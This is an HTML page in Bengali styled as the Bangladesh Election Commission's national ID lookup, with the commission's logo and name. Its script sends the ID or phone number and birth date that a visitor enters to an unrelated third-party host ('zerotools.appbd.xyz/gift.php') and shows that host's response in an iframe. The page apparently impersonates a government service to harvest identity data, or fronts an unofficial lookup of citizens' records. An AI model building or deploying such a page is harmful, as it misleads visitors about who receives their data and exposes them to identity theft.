<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>জাতীয় পরিচয়পত্র অনুসন্ধান</title>
    <style>
        body {
            font-family: 'SolaimanLipi', Arial, sans-serif;
            background-color: #ffffff;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            width: 100%;
            max-width: 400px;
            padding: 20px;
            background: #ffffff;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
        }
        .header {
            text-align: center;
            margin-bottom: 20px;
        }
        .header img {
            width: 80px;
            margin-bottom: 20px;
        }
        .header h1 {
            color: #1a3d7a;
            font-size: 24px;
            margin: 0;
            font-weight: bold;
        }
        .form-group {
            margin-bottom: 15px;
        }
        .form-group label {
            display: block;
            color: #1a3d7a;
            font-size: 16px;
            margin-bottom: 5px;
        }
        .form-group input {
            width: 100%;
            padding: 10px;
            border: 1px solid #b0c4de;
            border-radius: 5px;
            font-size: 14px;
            background-color: #e6f0ff;
            box-sizing: border-box;
        }
        .buttons {
            text-align: center;
            margin-top: 20px;
        }
        .buttons button {
            padding: 12px 30px;
            background-color: #1a3d7a;
            color: #ffffff;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            width: 100%;
            margin-bottom: 10px;
        }
        .buttons button:hover {
            background-color: #153e7a;
        }
        .footer {
            text-align: center;
            color: #1a3d7a;
            font-size: 14px;
            margin-top: 20px;
        }
        .progressbar {
            width: 100%;
            height: 10px;
            background-color: #e0e0e0;
            border-radius: 5px;
            margin-top: 10px;
            display: none;
        }
        .progressbar::after {
            content: '';
            display: block;
            height: 100%;
            width: 0;
            background-color: #4CAF50;
            border-radius: 5px;
            animation: progress 2s linear;
        }
        @keyframes progress {
            100% { width: 100%; }
        }
        iframe {
            width: 100%;
            height: 320px;
            border: none;
            border-radius: 5px;
            margin-top: 10px;
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <img src="https://services.nidw.gov.bd/nid-pub/resources/e1d92639b860ab242c1eedbff98f6887/images/logo-ec.png" alt="Bangladesh Election Commission Logo" onerror="this.src='https://via.placeholder.com/80';">
            <h1>জাতীয় পরিচয়পত্র অনুসন্ধান</h1>
        </div>
        <div class="form-group">
            <label for="nid">জাতীয় পরিচয়পত্র নম্বর / ফোন নম্বর</label>
            <input type="text" id="nid" placeholder="জাতীয় পরিচয়পত্র নম্বর অথবা ফোন নম্বর" />
        </div>
        <div class="form-group">
            <label for="birth-date">জন্ম তারিখ</label>
            <input type="text" id="birth-date" placeholder="DD-MM-YYYY (যেমন: 10-06-2000)" />
        </div>
        <div class="buttons">
            <button id="submitButton">সাবমিট</button>
            <button id="resetButton">রিসেট</button>
        </div>
        <div class="footer">
            বাংলাদেশ নির্বাচন কমিশন
        </div>
        <div id="progressbar" class="progressbar"></div>
        <iframe id="webview1" frameborder="0"></iframe>
    </div>

    <script>
        document.getElementById('submitButton').addEventListener('click', function() {
            const nid = document.getElementById('nid').value;
            const birthDate = document.getElementById('birth-date').value;
            const progressbar = document.getElementById('progressbar');
            const webview1 = document.getElementById('webview1');

            // Show progress bar
            progressbar.style.display = 'block';
            webview1.style.display = 'none'; // Hide iframe initially

            // Validate inputs
            if (!nid || !birthDate) {
                alert('জাতীয় পরিচয়পত্র নম্বর এবং জন্ম তারিখ পূরণ করুন।');
                progressbar.style.display = 'none';
                return;
            }

            // Construct the URL with the API
            const fullUrl = `https://zerotools.appbd.xyz/gift.php?nid=${encodeURIComponent(nid)}&dob=${encodeURIComponent(birthDate)}`;

            // Set the iframe source to the API URL
            webview1.src = fullUrl;
            webview1.style.display = 'block'; // Show iframe to display the result

            // Simulate loading time (optional, as the iframe will load the content)
            setTimeout(() => {
                progressbar.style.display = 'none';
            }, 2000);
        });

        document.getElementById('resetButton').addEventListener('click', function() {
            document.getElementById('nid').value = '';
            document.getElementById('birth-date').value = '';
            document.getElementById('progressbar').style.display = 'none';
            document.getElementById('webview1').style.display = 'none';
            document.getElementById('webview1').src = ''; // Clear iframe content
        });
    </script>
</body>
</html>
